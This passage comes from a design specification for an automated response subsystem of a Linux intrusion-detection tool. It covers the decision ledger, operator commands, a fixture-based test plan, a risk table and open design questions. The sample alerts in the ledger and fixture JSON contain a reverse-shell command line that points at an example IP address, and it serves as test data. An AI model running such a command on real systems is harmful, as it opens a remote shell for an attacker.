`NoNewPrivileges`, `ProtectSystem=strict`, `PrivateTmp`, `MemoryDenyWriteExecute`.

Two processes is one more moving part than one. It buys: the scan's sandbox untouched; a 300-line
executor whose entire input is a JSON work order it re-validates; and an audit trail where the
*requesting* and the *acting* identity are different units in the journal.

---

## 9. Chain of custody: the ledger

Append-only JSON lines, one directory, two files per day so the two processes never interleave
writes to one file:

```
/var/lib/banken/response/
  decisions-YYYY-MM-DD.jsonl   # written by the scan: every Decide, observe mode included
  actions-YYYY-MM-DD.jsonl     # written by the drain: requested→executed/failed/expired, thaw/restore
```

Same file-per-day pattern as the jsonl sink, but retention is `0` (keep) by default: these are the
undo handles and the evidence. One line:

```json
{"id":"01JBMX7Q0K8W5ZV4D2N9H3C6PA","time":"2026-10-31T06:12:03Z","phase":"decided",
 "alert":{"rule":"reverse_shell","level":"high","source":"auditd","time":"2026-10-31T06:10:41Z",
          "image":"/tmp/.x/sh","commandLine":"sh -i >& /dev/tcp/192.0.2.1/4444 0>&1","user":"u"},
 "decision":{"intended":"freeze","action":"none","rail":"observe-mode","entry":"freeze-revshell",
             "reason":"mode=observe: would freeze tree of pid 4242",
             "target":{"process":{"pid":4242,"ppid":4100,"image":"/tmp/.x/sh","eventTime":"2026-10-31T06:10:41Z"}}},
 "policy":"sha256:9f2c…","mode":"observe","killSwitch":false,"banken":"0.4.0"}
```

An `executed` line adds `handle` (`{"id":…,"kind":"freeze","undo":"/sys/fs/cgroup/banken.quarantine/01JB…"}`),
`live` (what §5.1 verified: starttime, exe, cgroup), `method` (`cgroup`/`sigstop`,
`rename`/`neuter`) and timing. A `failed` line has `error` (`stale target`, `gone`, `EXDEV`…).
`thaw`/`restore` lines reference the handle. One journal line per executed/failed action, at
`daemon.warning`, mirrors it for anyone grepping the journal.

The ledger is what `banken respond list` reads and what an analyst hands to whoever asks "why did
you kill my process". It is also what a root-level attacker cannot un-write without the
`tamper_banken` rule firing on the attempt - which is the honest extent of its tamper resistance.

### 9.1 Operator surface

```
banken respond list [--since 24h]          # handles with their state (frozen / killed / quarantined / restored)
banken respond thaw <id>                    # reverse a freeze
banken respond restore <id> [--to PATH]     # reverse a quarantine
banken respond explain <alert.json|ledger-id>   # print Decide's verdict and the live Verify() without acting
banken check … --policy /etc/banken/banken.yml  # the existing REPL gains: rules fired → decision → rail
```

`explain` and `check --policy` are the dry-run; they call `Decide` and, at most, `Executor.Verify`.

---

## 10. Test strategy

The standard is the detection corpus's: a decision is proven by a named fixture, and a missing
fixture fails the build.

### 10.1 `should-kill` fixtures (decision layer; no process is ever touched)

Directory `tests/response/`, one JSON file per case, named like the detection fixtures so the
expectation is readable in `ls`:

```
tests/response/revshell_enforce.expect-freeze.json
tests/response/revshell_observe.expect-none.json
tests/response/revshell_pid1.expect-none.json
tests/response/revshell_sshd.expect-none.json
tests/response/miner_tagonly_kill.expect-invalid.json      # policy must fail to load
tests/response/dropper_tmp.expect-quarantine.json
tests/response/dropper_nixstore.expect-none.json
tests/response/generic_source.expect-none.json
tests/response/ratelimit_4th.expect-none.json
tests/response/no_pid.expect-none.json
```

The suffix asserts the final `Action`. The body can pin more:

```json
{
  "policy": "policies/enforce.yml",
  "alert": {
    "kind": "sigma", "rule": "reverse_shell", "level": "high", "source": "auditd",
    "tags": ["attack.command-and-control", "attack.t1059.004"],
    "time": "2026-10-31T06:10:41Z",
    "event": { "source": "auditd", "image": "/tmp/.x/sh",
               "commandLine": "sh -i >& /dev/tcp/192.0.2.1/4444 0>&1",
               "user": "u", "pid": 4242, "ppid": 4100, "time": "2026-10-31T06:10:41Z" }
  },
  "self": { "exe": "/run/current-system/sw/bin/banken" },
  "killSwitch": false,
  "budget": { "runUsed": 0, "runLimit": 3, "hourUsed": 0, "hourLimit": 10 },
  "seen": [],
  "expect": {
    "action": "freeze",
    "intended": "freeze",
    "rail": "",
    "entry": "freeze-revshell",
    "scope": "tree",
    "target": { "process": { "pid": 4242 } }
  }
}
```

`policy` is a path relative to `tests/response/policies/` (a handful of shared policies:
`observe.yml`, `enforce.yml`, `enforce-kill-pinned.yml`, `tagonly-kill.yml`), or an inline YAML
string. `expect-invalid` fixtures assert the policy *fails validation* with a message containing
`expect.error`.

**Worked example - three fixtures, one alert.** Same reverse-shell alert as above:

| fixture | policy | expect |
| --- | --- | --- |
| `revshell_enforce.expect-freeze.json` | `enforce.yml` | `action=freeze intended=freeze rail=""` |
| `revshell_observe.expect-none.json` | `observe.yml` | `action=none intended=freeze rail=observe-mode` |
| `revshell_sshd.expect-none.json` | `enforce.yml`, event `image: /run/current-system/sw/bin/sshd` | `action=none intended=freeze rail=denylist` |

The second one is the important shape: observe mode is asserted to have *reached the right
intention* and been stopped by the right rail, so the corpus proves the policy, not just the mode.

**Harness** (`internal/response/fixtures_test.go`, mirroring `engine/fixtures_test.go`):

- `TestResponseFixtures`: every file is a subtest; loads policy, builds `Input`, calls `Decide`,
  compares `expect` field by field, and parses the filename suffix as the `action` expectation.
- `TestEveryPolicyEntryHasAFixture`: every entry in every `tests/response/policies/*.yml` must be
  the `entry` of at least one `expect-<its action>` fixture - a policy entry no fixture triggers is
  as untested as a rule without a fixture.
- `TestEveryRailHasAFixture`: every `Rail` constant appears as `expect.rail` in at least one
  fixture.
- `TestDetectionFixturesNeverActInObserve`: replays every `tests/fixtures/*.json` through the
  engine with the real rules, then through `Decide` with `observe.yml`: every decision's `action`
  is `none`. The default install is proven inert end to end.
- `TestDetectionFixturesNeverTargetDenylisted`: same replay with `enforce.yml` and the event's image
  rewritten to each built-in denylisted exe in turn: never anything but `none`/`denylist`.
- `FuzzDecideNeverCrossesRails` (rapid property, `just property-deep` style): random alerts, random
  policies that validate, random `Self`: `Decide` never panics; never returns `kill` for a
  tag-only entry; never returns a non-`none` action for pid ∈ {1,2}, ppid ∈ {0,2}, the self exe,
  a `generic` source, a `PID == 0` target, or a path under `/nix/store`; `observe` always yields
  `none`; and `Decide` is a pure function (calling twice gives equal output).

### 10.2 Executor: the fake

`exec.Fake` implements `Executor`, records `[]Call{Method, Target, Scope}` and returns scripted
results. Tests on `Responder` + drain use it to assert the *protocol*:

- `decided` is written before a work order exists; `requested` after; never a work order without
  both.
- The drain re-decides: a work order carrying `kill` under a policy now set to `observe` executes
  nothing and writes `failed: downgraded by executor (observe-mode)`.
- A `failed` ledger line is written for `ErrStaleTarget`, `ErrGone`, `EXDEV`, and a scripted
  panic; the drain continues to the next order.
- Idempotence: draining the same order twice calls the executor twice and the second ledger line
  says `already-applied`.
- Expired orders are not executed.
- Kill-switch present at drain time stops everything even if the order was decided before it was
  touched.

None of this runs on anything but a `t.TempDir()` spool and ledger; it passes on the Mac.

### 10.3 Executor: the real thing, sandboxed

`exec/linux_integration_test.go`, build tag `integration`, and additionally skipped unless
`BANKEN_EXEC_SANDBOX=1` *and* the test is root *and* `/sys/fs/cgroup/cgroup.controllers` exists. It
is meant to run in the NixOS VM test (`tests/vm.nix`, KVM on hokkaido) and nowhere else by accident.
Every victim is a child the test spawns itself (`sleep 300` in its own cgroup under a
test-specific `banken.quarantine/test-<pid>/`), never a pre-existing process:

- `Verify` on the live child returns its starttime and exe; `Verify` with `EventTime` set *before*
  the child's starttime returns `ErrStaleTarget` (this is the reuse check, exercised without
  needing to force an actual pid reuse); `Verify` after the child exits returns `ErrGone`.
- `Freeze(tree)` of a child that forks grandchildren: `cgroup.events` reads `frozen 1`, all pids are
  in the cgroup, a grandchild forked during migration is caught; `Thaw` returns every pid to its
  original cgroup and the child keeps running (observable: it increments a counter in a file
  before and after).
- `Kill(process)` via pidfd: pid gone, no zombie left to the test (the test reaps). `Kill(tree)` via
  `cgroup.kill`: child and grandchildren gone, cgroup removed.
- `Quarantine` in `t.TempDir()`: inode, mode, mtime, xattr preserved; manifest correct; `Restore`
  puts it back; restoring twice is a no-op. Same test against a file on a tmpfs mount with the
  quarantine dir on `/var`: `EXDEV` takes the neuter path, mode `0000`, immutable bit set where
  supported, restore clears both.
- Denylist re-check: `Kill` of a `ProcessRef{PID: 1}` is refused before any syscall (asserted by a
  seccomp-free strace-less trick: the fake-free executor is called with pid 1 and must return the
  denylist error without `pidfd_open` ever succeeding - checked by the error type).

The `justfile` gains `test-exec-sandbox` that refuses to run outside a VM (checks
`systemd-detect-virt`), and the CI matrix adds it under the `nix flake check` VM job when that lands.

### 10.4 Coverage gate

`TestEveryActionIsFixtured`: the set of `Action` constants the loader accepts must each have at
least one `expect-<action>` fixture; a reserved action must have one `expect-invalid`. Adding
`isolate` later means adding its fixtures first, or the build fails - the same forcing function
`TestEveryRuleHasAFixture` provides for rules.

---

## 11. Risks and failure modes

| Risk | Consequence | Mitigation in this design |
| --- | --- | --- |
| Late by design (one interval) | the process has finished or exited before the response | honest `ErrGone` in the ledger; `freeze` keeps what *is* still running; `--watch` shortens it |
| Pid reused before the response | acting on an innocent process | §5.1: pidfd + liveness + starttime ≤ event time; refuse on doubt |
| Attacker forks faster than migration | a descendant escapes a freeze | bounded fixpoint loop, frozen-on-arrival cgroup; `cgroup.kill` for kill; pass count in ledger |
| Shared cgroup | freezing the operator's session | never freeze in place; always move to `banken.quarantine/<id>` |
| systemd loses track of a moved process | `systemctl stop` misses it | documented; `respond list`; thaw moves it back |
| Frozen process holds a lock/tty/socket | things wait on it | that is what freeze means; ledger + journal line say so; thaw |
| Wrong file renamed | user file in quarantine | post-rename inode check and automatic rename-back (§5.4) |
| Cross-fs quarantine | `EXDEV` | neuter in place, never copy; recorded |
| Forged alert via writable source | kill of an arbitrary pid | `enforceSources` default excludes generic; rails apply regardless |
| Rogue remote rule self-tags | earns an action | tag-only entries limited to reversible actions; `kill` pinned by rule name |
| Policy typo | silent no-op or wrong target | load-time validation errors, rule-name warning, fixtures for every entry |
| Scan process compromised | forged work orders | executor re-decides from disk policy; rails; rate limit; kill-switch |
| Root attacker | thaws, restores, clears immutable, edits ledger | not preventable from userspace; `tamper_banken` fires; this spec does not claim otherwise |
| Ledger disk growth | fills `/var/lib` | bounded by rate limits; retention option exists (default keep) |
| Reboot | frozen state gone, handles dangle | boot-id on every line; `list` marks them `not-applicable` |
| cgroup v1 host | no freezer | SIGSTOP fallback, labelled as such |
| Clock step between event and response | starttime bound mis-evaluates | tolerance + exe comparison recorded; refusal on doubt |

---

## 12. Phasing (so the first PR is small)

0. **Prerequisites** - `Event.PID/PPID/ProcessStart` + parser plumbing + goldens; `Rule.Tags` →
   `Alert.Tags`. Pure additions; shippable alone.
1. **Decision layer in observe mode** - `internal/response` (policy, `Decide`, ledger, responder),
   wired into `main.go` behind `response:`; `tests/response/` corpus and harness; `banken check
   --policy`. Nothing can act yet; the ledger starts accumulating real would-have-done lines.
2. **Executor: freeze/thaw/kill** - `exec/`, spool, `banken respond drain|list|thaw|explain`,
   `banken-respond.{service,path}`, the sandbox integration test. `enforce` becomes real.
3. **Quarantine/restore.**
4. **Later** - `collect`, `isolate` (per-cgroup nft), fanotify `Block` under `--watch`, NixOS
   module options rendering all of the above and deriving the executor's capability set.

---

## 13. Open questions for Conor

1. **Cgroup home for frozen trees.** Plain `/sys/fs/cgroup/banken.quarantine/<id>` (no D-Bus, few
   parts, "foreign subtree" systemd tolerates) vs a transient systemd scope via `StartTransientUnit`
   (blessed, visible in `systemctl`, but a D-Bus client dependency and awkward late-child
   migration). I lean plain directory for v1; your call, since it touches the hokkaido unit
   layout.
2. **`kill` must be rule-name-pinned; tag-only may freeze/quarantine.** Is that asymmetry the right
   line, or should *every* enforce action require `rules:` and tags be observe-only?
3. **Root processes.** Should the default policy refuse to act on uid 0 processes unless
   `allowRoot: true`? Malware often runs as root; so does everything that keeps the box alive.
   The built-in denylist covers the known names, but a default-refuse on uid 0 is a stronger rail
   with a real cost.
4. **Two units vs one.** The separate `banken-respond` executor is the least-privilege answer, at
   the price of a spool and a `.path` unit. If you would rather accept a wider scan sandbox for
   fewer moving parts, the decision layer and tests are identical; only §8 changes. I would not,
   but it is a legitimate trade.
5. **Composite actions.** `collect → freeze` and `freeze → quarantine` are the natural incident
   shapes; v1 entries carry one `action`. Allow `actions: [collect, freeze]` from the start, or
   wait for `collect` to exist?
6. **Quarantine filesystem policy.** Is "rename when same-fs, neuter in place on `EXDEV`" the right
   default, or do you want a per-mount quarantine dir (`<mount>/.banken-quarantine`) so rename
   always works? The latter creates root-owned dirs at the top of user filesystems, which I
   count as a rough edge.
7. **Ledger location and retention.** `/var/lib/banken/response/` with keep-forever, vs beside the
   jsonl alerts in `/var/log/banken` with the alert retention. Chain of custody argues for the
   former; "one place to look" for the latter.
8. **`sshd-session` and friends.** The built-in denylist is a name list; names drift
   (`sshd-session` arrived in OpenSSH 9.8). Is a name list acceptable with a fixture per name, or do
   you want it keyed by systemd unit (`sshd.service`'s cgroup) which is sturdier on NixOS but
   Linux/systemd-specific?
9. **ProcessId in rules.** Exposing `PID/PPID` to the matcher as `ProcessId`/`ParentProcessId` is
   free once the fields exist and matches SigmaHQ naming; any reason to keep them out of the
   match surface?
10. **Attack-range proof.** Should the attackrange scorecard grow an "expected response" column so
    each emulation asserts not just the rule but the decided action (observe mode, from the
    ledger)? It is the same corpus idea one level up.
